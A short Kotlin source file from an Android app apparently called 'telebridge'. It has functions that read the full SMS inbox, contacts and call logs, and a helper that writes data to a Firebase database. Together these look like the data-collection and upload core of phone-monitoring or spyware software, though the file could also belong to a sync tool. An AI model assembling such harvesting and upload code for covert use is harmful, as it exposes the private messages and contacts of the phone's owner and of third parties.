package com.example.telebridge_android_app.utils

import android.content.Context
import com.google.firebase.database.FirebaseDatabase
import android.net.Uri
import android.provider.ContactsContract
import android.provider.CallLog

// Lire SMS
fun readSms(context: Context): List<Map<String, String>> {
    val smsList = mutableListOf<Map<String, String>>()
    val cursor = context.contentResolver.query(
        Uri.parse("content://sms/inbox"),
        arrayOf("address", "body", "date"),
        null, null, "date DESC"
    )

    cursor?.use {
        while (it.moveToNext()) {
            val address = it.getString(it.getColumnIndexOrThrow("address"))
            val body = it.getString(it.getColumnIndexOrThrow("body"))
            val date = it.getString(it.getColumnIndexOrThrow("date"))
            smsList.add(mapOf("address" to address, "body" to body, "date" to date))
        }
    }
    return smsList
}

// Lire Contacts
fun readContacts(context: Context): List<Map<String, String>> {
    val contactList = mutableListOf<Map<String, String>>()
    val cursor = context.contentResolver.query(
        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
        arrayOf(
            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
            ContactsContract.CommonDataKinds.Phone.NUMBER
        ),
        null, null, null
    )

    cursor?.use {
        while (it.moveToNext()) {
            val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
            val number = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
            contactList.add(mapOf("name" to name, "number" to number))
        }
    }
    return contactList
}

// Lire Historique Appels
fun readCallLogs(context: Context): List<Map<String, String>> {
    val callList = mutableListOf<Map<String, String>>()
    val cursor = context.contentResolver.query(
        CallLog.Calls.CONTENT_URI,
        arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION),
        null, null, CallLog.Calls.DATE + " DESC"
    )

    cursor?.use {
        while (it.moveToNext()) {
            val number = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER))
            val type = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.TYPE))
            val date = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.DATE))
            val duration = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.DURATION))
            callList.add(mapOf("number" to number, "type" to type, "date" to date, "duration" to duration))
        }
    }
    return callList
}


//
fun uploadToFirebase(node: String, data: Any) {
    val database = FirebaseDatabase.getInstance()
    val ref = database.getReference(node)
    ref.setValue(data)
}